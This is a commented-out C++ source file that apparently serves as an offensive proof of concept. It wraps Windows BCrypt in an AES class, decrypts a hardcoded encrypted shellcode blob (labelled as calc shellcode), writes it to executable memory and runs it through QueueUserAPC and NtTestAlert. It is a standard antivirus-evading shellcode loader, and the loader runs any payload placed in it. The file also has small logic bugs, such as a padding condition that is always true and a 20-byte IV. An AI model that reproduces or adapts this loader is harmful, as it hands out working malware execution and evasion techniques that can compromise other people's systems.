//#include <iostream>
//#include "EasyBCrypt.h"
//#include <format>
//#include <fstream>
//#include <sstream>
//#include <stdexcept>
//
//
//#pragma region debug functions
//void PrintBytes(
//	IN BYTE* pbPrintData,
//	IN DWORD    cbDataLen)
//{
//	DWORD dwCount = 0;
//
//	for (dwCount = 0; dwCount < cbDataLen; dwCount++)
//	{
//		printf("0x%02x, ", pbPrintData[dwCount]);
//
//		if (dwCount + 1 % 32 == 0)
//			std::cout << std::endl;
//	}
//	std::cout << std::endl;
//
//}
//
//void Print(IN char* pbPrintData,
//	IN DWORD    cbDataLen)
//{
//	for (size_t i = 0; i < cbDataLen; i++)
//	{
//		if (i % cbDataLen > 25 and pbPrintData[i % cbDataLen] == ' ')
//			std::cout << std::endl;
//		std::cout << pbPrintData[i];
//	}
//	std::cout << std::endl;
//}
//#pragma endregion debug functions
//
//// Cipher class
//class AESCipher
//{
//public:
//	AESCipher(std::vector<BYTE> key, const std::wstring& chainingMode);
//	void Dispose();
//	void SetIV(std::vector<BYTE>& IV);
//	std::string Encrypt64(const std::string& plaintText);
//	std::string Decrypt64(const std::string& cipherText);
//	
//
//private:
//	BCRYPT_ALG_HANDLE hAlg;
//	std::vector<BYTE> pbBlob;
//	std::vector<BYTE> IV;
//	bool usePadding{ true };
//};
//
//AESCipher::AESCipher(std::vector<BYTE> key, const std::wstring& chainingMode)
//{
//	BCryptBuffer CAPIParameterBuffers[] = {
//							{
//								sizeof(BCRYPT_SHA256_ALGORITHM),
//								KDF_HASH_ALGORITHM,
//								(PVOID)BCRYPT_SHA256_ALGORITHM,
//							}
//	};
//
//	BCryptBufferDesc CAPIParameters = {
//										BCRYPTBUFFER_VERSION,
//										1,
//										CAPIParameterBuffers
//	};
//
//	// determine if padding is needed according to msdn
//	if (chainingMode != BCRYPT_CHAIN_MODE_CBC or chainingMode != BCRYPT_CHAIN_MODE_CFB)
//		usePadding = false;
//
//	auto optAESBlob = EasyBCrypt::CreateAESKeyBlob(hAlg, key, chainingMode, BCRYPT_CAPI_KDF_ALGORITHM, &CAPIParameters);
//	if (auto out = std::get_if<std::vector<BYTE>>(&optAESBlob))
//		pbBlob = std::move(*out);
//	else
//		throw std::runtime_error(std::format("Error returned from CreateAESKeyBlob: {:#X}", std::get<NTSTATUS>(optAESBlob)));
//
//}
//
//void AESCipher::Dispose()
//{
//	BCryptCloseAlgorithmProvider(hAlg, 0);
//}
//
//
//void AESCipher::SetIV(std::vector<BYTE>& IV)
//{
//	this->IV = std::move(IV);
//}
//
//std::string AESCipher::Encrypt64(const std::string& plaintText)
//{
//	auto optEncryption64 = EasyBCrypt::Encrypt64(hAlg, pbBlob, IV, plaintText, usePadding);
//	
//	if (auto out = std::get_if<std::string>(&optEncryption64))
//		return *out;
//
//	NTSTATUS status = std::get<NTSTATUS>(optEncryption64);
//	return std::format("Error status: {:#X}", status);
//}
//
//
//std::string AESCipher::Decrypt64(const std::string& cipherText)
//{
//	auto optDecryption64 = EasyBCrypt::Decrypt64(hAlg, pbBlob, IV, cipherText, usePadding);
//
//	if (auto out = std::get_if<std::string>(&optDecryption64))
//		return *out;
//
//	NTSTATUS status = std::get<NTSTATUS>(optDecryption64);
//	return std::format("Error status: {:#X}", status);
//}
//
//#pragma comment(lib, "ntdll")
//
//int main()
//{
//
//	std::vector<BYTE> IV = { 0x0, 0x1, 0x2, 0x3, 0x4, 0x0, 0x1, 0x2, 0x3, 0x4, 0x0, 0x1, 0x2, 0x3, 0x4, 0x0, 0x1, 0x2, 0x3, 0x4 };
//
//	// encrypted x86 calc shellcode
//	std::string EncryptedShellcode = "u6R0Jjuea85DtvQ8bn/jA6vcFDbgenJQJzGrR7pAT+2SxddZZn9VPa7+JKxyIuibFPnEGtv+xJTSoR5PKU1qEIUotHIAd1ikAse92zLK8Xpiksu4OX/m4LeBMnHLH04dDN3Y0MiT4gcAERPMtf4F78APY9dA7GuJ1uuU5BWSD3ifQTNEpVDv1+ebinANysDgA+hv1uKBCIpt+ETwrVrPnzRYpnx20sONfnTBsvuZ1j/gH9WXXVIzLoxqkU7mKIkZ";
//	
//	std::vector<BYTE> key = { 0xff, 0xfe, 0xfd, 0xfc, 0xfb, 0xfa, 0xf9, 0xf8, 0xf7, 0xf6, 0xf5, 0xf4, 0xf3, 0xf2, 0xf1, 0xf0 };
//
//	try
//	{
//		// initialize the cipher class and decrypt the shellcode
//		AESCipher cipher(key, BCRYPT_CHAIN_MODE_CBC);
//		
//		// set the same IV which the shellcode encrypted with. 
//		cipher.SetIV(IV);
//		std::string shellDecrypt = cipher.Decrypt64(EncryptedShellcode);
//
//		// alias for NtTestAlert
//		using myNtTestAlert = NTSTATUS(NTAPI*)();
//
//		// grab the address of NtTestAlert
//		myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
//
//		// allocate virtual memory
//		LPVOID shellAddress = VirtualAlloc(NULL, shellDecrypt.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//
//		// copy the shellcode to the destination
//		memcpy(shellAddress, reinterpret_cast<BYTE*>(shellDecrypt.data()), shellDecrypt.size());
//
//		// queue an APC call
//		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
//		QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
//
//		// trigger the call
//		testAlert();
//
//		// cleanup
//		cipher.Dispose();
//	}
//	catch (std::runtime_error& e)
//	{
//		std::cerr << "An error occurred during cipher initialization. Exiting..." << e.what() << std::endl;
//		ExitProcess(1);
//	}
//}